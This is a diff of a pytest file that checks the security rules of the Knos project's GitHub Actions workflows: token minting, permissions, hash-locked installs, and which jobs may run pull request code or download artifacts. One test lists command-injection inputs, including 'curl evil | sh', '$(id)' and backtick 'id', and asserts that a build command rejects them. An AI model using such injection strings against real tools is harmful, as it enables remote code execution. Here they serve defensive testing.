@@ -54,6 +54,7 @@ PERMISSIONS = {      # exactly what each job's command needs, and nothing else
 }
 SETUP_UV = {"version": "0.8.20", "python-version": "3.12", "enable-cache": False, "ignore-empty-workdir": True}
 SIGNS = {("fund.yml", "command"), ("prove.yml", "settle"), ("prove.yml", "attest"), (ATTEST, "attest")}      # the called jobs that mint a token
+LOCKED = SIGNS | {(ATTEST, "refused")}      # the called jobs that install from the lock: those, and the one that posts a refused verdict
 ATTEST_COMMAND = 'knos attest --repository "$R" --pull "$P" --order "$O" --kind "$K" ${PAYEES:+--payees "$PAYEES"}'
 ATTEST_INPUTS = ("repository", "pull", "order", "kind", "payees")
 # What a job that signs runs to install: every file named by its hash, nothing resolved, nothing built, and the list
@@ -62,6 +63,11 @@ LOCKED_INSTALL = (
     'uv venv --no-config --python 3.12 "$RUNNER_TEMP/knos"\n'
     'uv pip install --no-config --python "$RUNNER_TEMP/knos/bin/python" --require-hashes --no-deps --no-build -r - <<\'LOCK\'\n'
     'KNOS_LOCK\nLOCK\necho "$RUNNER_TEMP/knos/bin" >> "$GITHUB_PATH"\n')
+
+
+# The two jobs outside the pinned workflows that ask GitHub for a token with steps of their own. Neither token is one a
+# program of Knos reads, neither job runs a pull request's code, and each has a test of its own below.
+OWN_STEPS = {("knos-reproduce.yml", "sign"), ("knos-meter-batch.yml", "close-sign")}
 
 
 def _doc(path: Path) -> dict:
@@ -101,7 +107,7 @@ def _mine() -> list[Path]:
 
 def _install(name: str, job: str) -> str:
     """The one script that installs knos in a job of the three called workflows."""
-    if (name, job) in SIGNS:
+    if (name, job) in LOCKED:
         return LOCKED_INSTALL
     return (JUDGE_INSTALL if job == "judge" else INSTALL).format(release=_release())
 
@@ -146,7 +152,7 @@ def test_what_a_repository_installs_is_what_knos_runs_on_itself():
     # one payment file and one optional check: nothing else to install, and nothing still calls the first deployment's relay
     assert sorted(p.name for p in EXAMPLES.glob("*.yml")) == ["knos-attest.yml", "knos-attestor.yml", "knos-canary.yml", "knos-check.yml",
                                                               "knos-claim-org.yml", "knos-claim.yml", "knos-install.yml", "knos-meter-batch.yml",
-                                                              "knos-workflow.yml"]
+                                                              "knos-reproduce.yml", "knos-workflow.yml"]
     # an organisation's claim file, which `knos claim --org` puts into <organisation>/knos-claim, is its example byte for byte
     assert (ROOT / "src" / "knos" / "settle" / "knos-claim-org.yml").read_bytes() == (EXAMPLES / "knos-claim-org.yml").read_bytes()
     assert not (WF / "relay.yml").exists() and not any("relay.yml" in p.read_text(encoding="utf-8") for p in _mine())
@@ -215,7 +221,9 @@ def test_a_token_is_asked_for_only_by_jobs_that_run_no_pull_request_code_and_che
                        *((f, j) for f in ("knos.yml", "knos-workflow.yml") for j in ("command", "settle", "review")),
                        ("knos-install.yml", "command"), ("knos-install.yml", "settle"),      # the file `knos install` opens a pull request with
                        ("knos-meter-batch.yml", "timer"), ("knos-meter-batch.yml", "hand"),  # a meter batch: each a call to the pinned attest.yml
-                       ("knos-claim.yml", "claim"), ("knos-claim-org.yml", "claim")}, minting
+                       ("knos-claim.yml", "claim"), ("knos-claim-org.yml", "claim"),
+                       ("knos-reproduce.yml", "sign"),              # an outside reproduction: a token over a report, which no program of Knos accepts
+                       ("knos-meter-batch.yml", "close-sign")}, minting   # a month's close, signed for one side: a token over the close record, kept off chain
     # an `auto` order adds no job, no event and no permission: prove.yml's attest job, after the judge, asks for the one
     # token, and `knos settle --tests` decides its audience (knos3:auto for an open pull request of an order funded
     # `auto`, knos3:pay otherwise; tests/test_flow_orders.py). The job that runs the submission still has no id-token.
@@ -233,7 +241,10 @@ def test_a_token_is_asked_for_only_by_jobs_that_run_no_pull_request_code_and_che
     # in a calling file such a job is a call to a pinned workflow and nothing else
     for path in _mine():
         for name, job in _doc(path)["jobs"].items():
-            if (path.name, name) in minting and path.name not in PUBLISHED:
+            # The one exception has steps of its own because it must run where no workflow of Knos is called: in a
+            # stranger's repository, to say that THEIR run vouches for a report. It is held to its own rule below.
+            # So has the close of a meter month: the record is read from the repository of the side that signs it.
+            if (path.name, name) in minting and path.name not in PUBLISHED and (path.name, name) not in OWN_STEPS:
                 assert "steps" not in job and job["uses"].startswith((CALLED, ROTATE)), (path.name, name)
 
 
@@ -270,10 +281,11 @@ def test_the_job_that_runs_pull_request_code_can_only_read_and_hands_nothing_on(
     assert command["env"] == {"ISSUE": "${{ needs.review.outputs.tests }}"} and command["run"].endswith("--sandbox require")
     assert [s for s in _steps(judge) if "GH_TOKEN" in (s.get("env") or {})] == [fetch]
     assert _steps(judge).index(install) < _steps(judge).index(probe) < _steps(judge).index(command)      # checked before the code runs
-    # It is the only job that has anything of a pull request on disk: no other job checks anything out or uses git.
+    # It is the only job that has anything of a pull request on disk, with attest.yml's rerun job, which is the same judge
+    # in another repository (its own test is below): no other job checks anything out or uses git.
     for name in PUBLISHED:
         for job_name, job in _jobs(name).items():
-            if (name, job_name) != ("prove.yml", "judge"):
+            if (name, job_name) not in (("prove.yml", "judge"), (ATTEST, "rerun")):
                 assert not _steps(job, "actions/checkout@"), (name, job_name)
                 assert not re.search(r"\bgit\b|refs/pull|gh pr checkout", "\n".join(_scripts(job))), (name, job_name)
     # The job that mints takes one fact from it: that it succeeded. Which pull request, which head commit and which
@@ -453,7 +465,7 @@ def test_no_caller_can_change_which_code_judges():
             steps.append(uv["with"])
             assert install["run"] == _install(name, job_name)
             assert "--no-config" in install["run"]
-            if (name, job_name) in SIGNS:
+            if (name, job_name) in LOCKED:
                 # named by hash: no date cutoff, which hashes make moot; the list is the one thing a release writes in
                 assert "env" not in install and "--require-hashes" in install["run"] and "UV_EXCLUDE_NEWER" not in json.dumps(job)
             else:
@@ -502,7 +514,10 @@ def test_no_job_of_the_payment_flow_restores_or_saves_a_cache():
     for name in PUBLISHED:
         for job_name, job in _jobs(name).items():
             assert job.get("cache-mode") == "read", (name, job_name)
-            assert not _caches(job) and not [s for s in _steps(job) if "artifact" in str(s.get("uses", ""))], (name, job_name)
+            # no artifact either. One job writes one and reads none: attest.yml's rerun, whose verdict file is kept for
+            # whoever audits the run. No job of these workflows downloads an artifact, so nothing that signs can read it.
+            kept = [str(s["uses"]).split("@")[0] for s in _steps(job) if "artifact" in str(s.get("uses", ""))]
+            assert not _caches(job) and kept == (["actions/upload-artifact"] if (name, job_name) == (ATTEST, "rerun") else []), (name, job_name)
 
 
 # The caches that may sit in a job which sees a secret: notes a script reads as data and never runs, written only by
@@ -923,6 +938,132 @@ def test_the_claim_caller_names_the_pinned_commit_and_takes_the_address_from_the
 
 # ---- the attestation workflow, the caller a seller commits, and the canary ------------------------------------------------
 
+def test_attests_first_job_runs_the_suite_again_with_no_way_to_sign_and_hands_on_one_verdict():
+    """attest.yml's rerun job: a second execution of an order's black-box acceptance suite, in the repository the run is
+    in. It runs a pull request's code, so it is held to what prove.yml's judge job is held to, and its one output is
+    text the next job validates (tests/test_attest_rerun.py)."""
+    job = _jobs(ATTEST)["rerun"]
+    assert job["permissions"] == {"contents": "read"} and job["runs-on"] == "ubuntu-24.04" and job["cache-mode"] == "read"
+    assert "secrets." not in json.dumps(job) and "needs" not in job and "if" not in job and "env" not in job and "container" not in job
+    assert job["outputs"] == {"verdict": "${{ steps.judge.outputs.verdict || steps.plan.outputs.verdict }}"}
+    # no checkout action: the two commits are fetched by their ids from the order's public repository, with no credential
+    assert [s["uses"].split("@")[0] for s in _steps(job) if "uses" in s] == ["astral-sh/setup-uv", "actions/upload-artifact"]
+    assert _steps(job, "astral-sh/setup-uv@")[0]["with"] == SETUP_UV
+    install, plan, fetch, probe, judge = [s for s in _steps(job) if "run" in s]
+    base = 'knos attest --repository "$R" --pull "$P" --order "$O" --kind "$K"'
+    assert install["run"] == JUDGE_INSTALL.format(release=_release())
+    assert plan["run"] == base + ' --plan "$RUNNER_TEMP/rerun"' and judge["run"] == base + ' --judge "$RUNNER_TEMP/rerun"'
+    facts = {"R": "${{ inputs.repository }}", "P": "${{ inputs.pull }}", "O": "${{ inputs.order }}", "K": "${{ inputs.kind }}"}
+    # the plan reads GitHub's record and Solana; it is the only step with a token, and that token can only read
+    assert plan["env"] == {"GH_TOKEN": "${{ github.token }}", **facts} and plan["id"] == "plan" and "if" not in plan
+    assert [s for s in _steps(job) if "GH_TOKEN" in (s.get("env") or {}) or "github.token" in json.dumps(s)] == [plan]
+    # everything after it happens only when the plan found a suite to run
+    for step in (fetch, probe, judge):
+        assert step["if"] == "steps.plan.outputs.rerun == '1'"
+    script = fetch["run"]
+    assert fetch["env"] == {"R": "${{ inputs.repository }}", "P": "${{ inputs.pull }}", "BASE": "${{ steps.plan.outputs.base }}",
+                            "HEAD": "${{ steps.plan.outputs.head }}"}
+    assert script.startswith("set -euo pipefail\n") and "${{" not in script and "git config" not in script and "AUTHORIZATION" not in script
+    for line in ("""case "$P" in ''|*[!0-9]*)""", """case "$BASE$HEAD" in *[!0-9a-f]*)""", '[ "${#BASE}" = 40 ] && [ "${#HEAD}" = 40 ]',
+                 'fetch -q --no-tags --depth 1 "$GITHUB_SERVER_URL/$R.git" "$BASE" "+refs/pull/$P/head:refs/knos/head"',
+                 'if [ "$(git -C "$w/git" rev-parse refs/knos/head)" != "$HEAD" ]; then',
+                 'git -C "$w/git" archive "$BASE" | tar -x -C "$w/base"', 'git -C "$w/git" archive "$HEAD" | tar -x -C "$w/pr"'):
+        assert line in script, line
+    assert script.index('case "$BASE$HEAD"') < script.index("fetch -q") < script.index("rev-parse") < script.index("archive")
+    # the sandbox is checked before the code runs, exactly as prove.yml's judge checks it, and the step that runs the code
+    # has the four facts and nothing else: no token, no secret
+    [theirs] = [s for s in _steps(_jobs("prove.yml")["judge"]) if str(s.get("name", "")).startswith("the sandbox has no network")]
+    assert probe["run"] == theirs["run"] and "env" not in probe and judge["env"] == facts and judge["id"] == "judge"
+    steps = _steps(job)
+    assert steps.index(install) < steps.index(plan) < steps.index(fetch) < steps.index(probe) < steps.index(judge)
+    # the verdict file is kept whether the suite passed or not; nothing is downloaded anywhere
+    [keep] = _steps(job, "actions/upload-artifact@")
+    assert keep["if"] == "${{ !cancelled() }}" and keep["with"] == {"name": "knos-verdict", "path": "${{ runner.temp }}/rerun/verdict.json",
+                                                                   "if-no-files-found": "ignore"}
+    # (two jobs of other files do download, each held to its own rule in the tests below: the reproduction's `sign`,
+    # which hashes what it was handed before it asks for anything, and the meter's `close`, which can ask for nothing)
+    downloads = {(p.name, name) for p in _mine() for name, j in _doc(p)["jobs"].items() if _steps(j, "actions/download-artifact@")}
+    assert downloads == {("knos-reproduce.yml", "sign"), ("knos-meter-batch.yml", "close")}
+    assert sum(p.read_text(encoding="utf-8").count("uses: actions/download-artifact@") for p in _mine()) == 2
+    said = _comments(WF / ATTEST)
+    for words in ("GitHub signs WHICH workflow ran", "It does not sign what the workflow read", "it can ask GitHub for no token",
+                  "reads that verdict as untrusted text", "the second never starts, and nothing is signed",
+                  "this judge read the buyer", "repository's check results; it did not run them", "`knos-verdict:` comment beside the token"):
+        assert words in said, words
+
+
+def test_a_months_close_is_signed_by_a_job_that_installs_nothing_and_checked_by_one_that_can_sign_nothing():
+    """examples/knos-meter-batch.yml signs a close in two jobs. `close-sign` asks GitHub for a token with steps of its
+    own; why that is safe: it runs only when a person starts the workflow and names a close record (the timer and a
+    batch never reach it), so no pull request's code is in the run; it installs nothing, checks nothing out, and reads
+    one file of the commit the run is at through the API with a token that can only read; and it asks only for an
+    audience it has checked to be a close's, `knosm:close:<buyer>:<seller>:<yyyymm>:<sha256>`, which no program reads
+    (the meter takes `knosm:batch:` and `knosm:claim:`). `close` installs knos, so it has no permission at all: it
+    holds the token to the record (`knos meter close --sign --token`, tests/test_ledger_periods.py) and keeps both."""
+    doc = _doc(EXAMPLES / "knos-meter-batch.yml")
+    jobs = doc["jobs"]
+    assert sorted(jobs) == ["close", "close-sign", "hand", "timer"] and sorted(doc["on"]) == ["schedule", "workflow_dispatch"]
+    assert jobs["timer"]["if"] == "github.event_name == 'schedule'" and jobs["hand"]["if"] == "github.event_name == 'workflow_dispatch' && inputs.close == ''"
+    assert doc["on"]["workflow_dispatch"]["inputs"]["as"]["options"] == ["buyer", "seller"] and doc["on"]["workflow_dispatch"]["inputs"]["close"]["default"] == ""
+    sign, keep = jobs["close-sign"], jobs["close"]
+    # the job that may ask: by hand only, one script of the runner's own tools, nothing installed
+    assert sign["if"] == "github.event_name == 'workflow_dispatch' && inputs.close != ''" and "needs" not in sign
+    assert sign["permissions"] == {"contents": "read", "id-token": "write"} and "secrets." not in json.dumps(doc["jobs"])
+    assert [s["uses"].split("@")[0] for s in sign["steps"] if "uses" in s] == ["actions/upload-artifact"]
+    [step] = [s for s in sign["steps"] if "run" in s]
+    script = step["run"]
+    # an input reaches the script only as an environment variable, and the path is checked before it is put in an address
+    assert step["env"] == {"GH_TOKEN": "${{ github.token }}", "CLOSE": "${{ inputs.close }}"} and "${{" not in script and script.startswith("set -euo pipefail\n")
+    assert not re.search(r"(?m)^\s*(?:uv|uvx|pip|pipx|npm|npx|knos|git|sudo|apt-get)\b", script) and "install" not in script
+    order = [script.index(text) for text in ("""case "$CLOSE" in ''|/*|*..*|*[!A-Za-z0-9._/-]*)""",
+                                             '"$GITHUB_API_URL/repos/$GITHUB_REPOSITORY/contents/$CLOSE?ref=$GITHUB_SHA" > close.json', "unset GH_TOKEN",
+                                             'audience="knosm:close:$who:$(sha256sum close.json | cut -d\' \' -f1)"',
+                                             "grep -Eqx 'knosm:close:[0-9]{1,20}:[0-9]{1,20}:[0-9]{6}:[0-9a-f]{64}'", '"$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$audience"')]
+    assert order == sorted(order) and script.count("ACTIONS_ID_TOKEN_REQUEST_URL") == 1
+    # the audience the script builds is the one the command checks the token against
+    assert "%d:%d:%06d" in script
+    assert 'f"knosm:close:{record[\'buyer\']}:{record[\'seller\']}:{record[\'month\']:06d}:{hashlib.sha256(close_bytes(record)).hexdigest()}"' in \
+        (ROOT / "src" / "knos" / "ledger.py").read_text(encoding="utf-8")
+    # the job that installs knos: no permission of any kind, the first job's two files, one command
+    assert keep["needs"] == "close-sign" and keep["permissions"] == {} and "if" not in keep and "GH_TOKEN" not in json.dumps(keep)
+    assert [s["uses"].split("@")[0] for s in keep["steps"] if "uses" in s] == ["astral-sh/setup-uv", "actions/download-artifact", "actions/upload-artifact"]
+    assert _steps(keep, "astral-sh/setup-uv@")[0]["with"] == SETUP_UV and _steps(keep, "actions/download-artifact@")[0]["with"] == {"name": "knos-close-token"}
+    assert _steps(sign, "actions/upload-artifact@")[0]["with"] == {"name": "knos-close-token", "path": "close.json\ntoken.jwt\n", "if-no-files-found": "error"}
+    install, command = [s for s in keep["steps"] if "run" in s]
+    assert install["run"] == f'uv tool install --no-config "knos=={_release()}"' and "env" not in install
+    assert command["run"] == 'knos meter close --sign close.json --as "$AS" --token token.jwt' and command["env"] == {"AS": "${{ inputs.as }}"}
+    assert _steps(keep, "actions/upload-artifact@")[0]["with"] == {"name": "knos-close", "path": "close.json.*.jwt\nclose.json.jwks.json\n", "if-no-files-found": "error"}
+    # the files it uploads are the ones the command writes beside the record
+    source = (ROOT / "src" / "knos" / "ledger.py").read_text(encoding="utf-8")
+    assert 'close_file.with_name(f"{close_file.name}.{name}")' in source and 'beside(sign, f"{role}.jwt")' in source and 'beside(sign, "jwks.json")' in source
+
+
+def test_the_reproductions_signing_job_runs_no_pull_request_code_and_signs_only_the_hash_of_the_report_it_was_handed():
+    """examples/knos-reproduce.yml's `sign` is the one job outside the pinned workflows that asks GitHub for a token, and
+    the one job anywhere that downloads an artifact. Why both are safe: the file starts by hand only, so no pull
+    request's code is ever in the run; the job that runs knos cannot ask for a token; the job that can installs
+    nothing, checks nothing out, and asks only for the audience `knos-repro:<sha256>` of bytes it has hashed itself,
+    which no program of Knos accepts (every program audience begins `knos3:`)."""
+    doc = _doc(EXAMPLES / "knos-reproduce.yml")
+    assert list(doc["on"]) == ["workflow_dispatch"] and doc["permissions"] == {} and sorted(doc["jobs"]) == ["run", "sign"]
+    run, sign = doc["jobs"]["run"], doc["jobs"]["sign"]
+    assert run["permissions"] == {"contents": "read"} and sign["permissions"] == {"id-token": "write"} and sign["needs"] == "run"
+    assert "secrets." not in json.dumps(doc) and "pull_request" not in json.dumps(doc) and "actions/checkout" not in json.dumps(doc)
+    # the signing job: the report in, one script, the packed file out
+    assert [s["uses"].split("@")[0] for s in sign["steps"] if "uses" in s] == ["actions/download-artifact", "actions/upload-artifact"]
+    assert sign["steps"][0]["with"] == {"name": "knos-report"}      # this run's own artifact: no run id, no other repository, no token
+    [script] = [s["run"] for s in sign["steps"] if "run" in s]
+    [step] = [s for s in sign["steps"] if "run" in s]
+    assert step["env"] == {"SHA": "${{ needs.run.outputs.sha256 }}"} and "${{" not in script
+    assert "uv " not in script and "pip " not in script and "git " not in script
+    # the hash is checked to be 64 hex digits and the file's own before anything is asked of GitHub, and the audience is that hash
+    check, ask = script.index('"$(sha256sum report.json | cut -d\' \' -f1)" != "$SHA"'), script.index("ACTIONS_ID_TOKEN_REQUEST_URL")
+    assert script.index("*[!0-9a-f]*") < check < ask and script.count("ACTIONS_ID_TOKEN_REQUEST_URL") == 1
+    assert '"$ACTIONS_ID_TOKEN_REQUEST_URL&audience=knos-repro:$SHA"' in script and "knos3:" not in json.dumps(doc)
+    # and the job that runs knos has no way to sign
+    assert "id-token" not in run["permissions"] and "ACTIONS_ID_TOKEN" not in json.dumps(run)
+
+
 def test_attest_takes_facts_never_code_reads_the_public_record_and_asks_for_one_signed_statement():
     doc = _doc(WF / ATTEST)
     assert set(doc["on"]) == {"workflow_call", "workflow_dispatch"}
@@ -931,12 +1072,18 @@ def test_attest_takes_facts_never_code_reads_the_public_record_and_asks_for_one_
     assert {k: (v["required"], v["type"]) for k, v in called.items()} == {
         "repository": (True, "string"), "pull": (True, "number"), "order": (True, "string"), "kind": (True, "string"), "payees": (False, "string")}
     assert "secrets" not in doc["on"]["workflow_call"] and "secrets." not in json.dumps(doc)       # no secret, optional or not
-    assert doc["permissions"] == {} and list(doc["jobs"]) == ["attest"]
+    assert doc["permissions"] == {} and list(doc["jobs"]) == ["rerun", "attest", "refused"]
+    # the third job only says why nothing was signed (tests/test_attest_rerun.py): it can ask for no token
+    assert doc["jobs"]["refused"]["permissions"] == {"contents": "read", "issues": "write"} and doc["jobs"]["refused"]["cache-mode"] == "read"
     job = doc["jobs"]["attest"]
     # read GitHub's record; post the signed statement on the "knos tokens" issue, where a relayer finds it; the statement itself
     assert job["permissions"] == {"contents": "read", "issues": "write", "id-token": "write"}
     assert "knos tokens" in _comments(WF / ATTEST) and "writes nothing" not in _comments(WF / ATTEST)
-    assert job["runs-on"] == "ubuntu-24.04" and job["cache-mode"] == "read" and "env" not in job and "container" not in job and "needs" not in job
+    assert job["runs-on"] == "ubuntu-24.04" and job["cache-mode"] == "read" and "env" not in job and "container" not in job
+    # it follows the job that runs the suite again, and only when that job succeeded: no `if` widens that, and of that job
+    # it takes one output, as an environment variable of the command, which reads it as untrusted text
+    assert job["needs"] == "rerun" and "if" not in job and "outputs" not in job
+    assert re.findall(r"needs\.[\w.]+", json.dumps(job)) == ["needs.rerun.outputs.verdict"]
     # no checkout of anything, no git, nothing a pull request wrote on disk: uv, the hash-locked install, the command
     assert [s["uses"].split("@")[0] for s in _steps(job) if "uses" in s] == ["astral-sh/setup-uv"] and _steps(job, "astral-sh/setup-uv@")[0]["with"] == SETUP_UV
     assert _scripts(job) == [LOCKED_INSTALL, ATTEST_COMMAND]
@@ -944,7 +1091,10 @@ def test_attest_takes_facts_never_code_reads_the_public_record_and_asks_for_one_
     # what people wrote reaches the command as environment variables, one each, and never inside the script
     [step] = [s for s in _steps(job) if s.get("run") == ATTEST_COMMAND]
     assert step["env"] == {"GH_TOKEN": "${{ github.token }}", "R": "${{ inputs.repository }}", "P": "${{ inputs.pull }}",
-                           "O": "${{ inputs.order }}", "K": "${{ inputs.kind }}", "PAYEES": "${{ inputs.payees }}"}
+                           "O": "${{ inputs.order }}", "K": "${{ inputs.kind }}", "PAYEES": "${{ inputs.payees }}",
+                           "KNOS_RERUN": "${{ needs.rerun.outputs.verdict }}"}
+    from knos import flow
+    assert flow.RERUN_ENV == "KNOS_RERUN"
     assert "${{" not in "".join(_scripts(job)) and "KNOS_RELAY_KEY" not in json.dumps(doc)
     said = _comments(WF / ATTEST)
     for words in ("No checkout", "No secret", "nothing a caller passes can change which code runs here", "pay (the terms were met)", "take (reserve",
@@ -952,7 +1102,6 @@ def test_attest_takes_facts_never_code_reads_the_public_record_and_asks_for_one_
                   "The kind eval is a buyer's, for knos_meter", "posts it as `knos-eval:`", "from the run's first attempt only"):
         assert words in said, words
     # the published path to a meter evaluation: kind eval, whose `order` carries the evaluation (`knos attest` reads it)
-    from knos import flow
     assert "eval" in flow.KINDS and "pay, take, revert, rule and eval" in called["kind"]["description"]
     assert "For eval, the evaluation instead, as order.milestone.rate" in called["order"]["description"]
     assert not re.search(r"\bimmutable\b|nobody can change", (WF / ATTEST).read_text(encoding="utf-8"), re.I)
@@ -1225,14 +1374,14 @@ def test_the_published_set_is_the_source_byte_for_byte_with_the_lock_written_in(
     for name in PUBLISHED:
         published, source = (out / ".github" / "workflows" / name).read_text(encoding="utf-8"), (WF / name).read_text(encoding="utf-8")
         assert "KNOS_LOCK" not in published, name                          # written in everywhere it stood
-        assert published.count(text.rstrip("\n").splitlines()[-1]) == sum(1 for j in _jobs(name) if (name, j) in SIGNS), name
+        assert published.count(text.rstrip("\n").splitlines()[-1]) == sum(1 for j in _jobs(name) if (name, j) in LOCKED), name
         for job_name, job in _doc(out / ".github" / "workflows" / name)["jobs"].items():
-            if (name, job_name) in SIGNS:    # the published job installs from exactly the published list, hash by hash
+            if (name, job_name) in LOCKED:    # the published job installs from exactly the published list, hash by hash
                 run = _installer(job)["run"]
                 assert run.split("<<'LOCK'\n")[1].split("\nLOCK\n")[0] == text.rstrip("\n"), (name, job_name)
                 assert "--require-hashes" in run
         # and in the source it is the one word KNOS_LOCK in those jobs, so an unfilled copy installs nothing
-        assert source.count("\n          KNOS_LOCK\n") == sum(1 for j in _jobs(name) if (name, j) in SIGNS), name
+        assert source.count("\n          KNOS_LOCK\n") == sum(1 for j in _jobs(name) if (name, j) in LOCKED), name
     assert (out / "LICENSE").read_bytes() == (ROOT / "LICENSE").read_bytes()
     readme = (out / "README.md").read_text(encoding="utf-8")
     assert f"knos {_release()} from PyPI" in readme and "REHEARSAL" not in readme and all(f"`.github/workflows/{n}`" in readme for n in PUBLISHED)
@@ -1284,7 +1433,7 @@ def test_the_lock_is_for_the_release_the_workflows_name_and_holds_the_wheel_and_
     good = lock.read_text(encoding="utf-8")
     last = good.splitlines()[-1]
     for wrong in (good.replace(last, ""), good + "typer==0.0.1 --hash=sha256:" + "0" * 64 + "\n", good.replace(last, last[:-1]),
-                  good.replace(last, last.replace(_release(), "9.9.9")), good.replace("solders==", "solderz=="), "knos==0.3.14 --hash=sha256:" + "a" * 64 + "\n"):
+                  good.replace(last, last.replace(_release(), "9.9.9")), good.replace("solders==", "solderz=="), "knos==0.3.15 --hash=sha256:" + "a" * 64 + "\n"):
         bad = tmp_path / "bad.txt"
         bad.write_text(wrong, encoding="utf-8")
         with pytest.raises(SystemExit, match="the lock is not"):
@@ -1321,7 +1470,7 @@ def test_a_rehearsal_variant_differs_in_how_knos_is_installed_and_in_nothing_els
             pub.main(["check", str(out)])                  # a checkout is checked against the set it was made as, named
     assert pub.main(["check", str(out), "--lock", str(_lock(tmp_path, pub))]) == 1
     capsys.readouterr()
-    for bad in ('knos"; curl evil | sh; "', "knos==0.3.14 # x", "$(id)", "knos\nrun: x", "a: b", "`id`", ""):
+    for bad in ('knos"; curl evil | sh; "', "knos==0.3.15 # x", "$(id)", "knos\nrun: x", "a: b", "`id`", ""):
         with pytest.raises(SystemExit):
             pub.main(["build", str(tmp_path / "bad"), "--source", bad])
     assert not (tmp_path / "bad").exists()
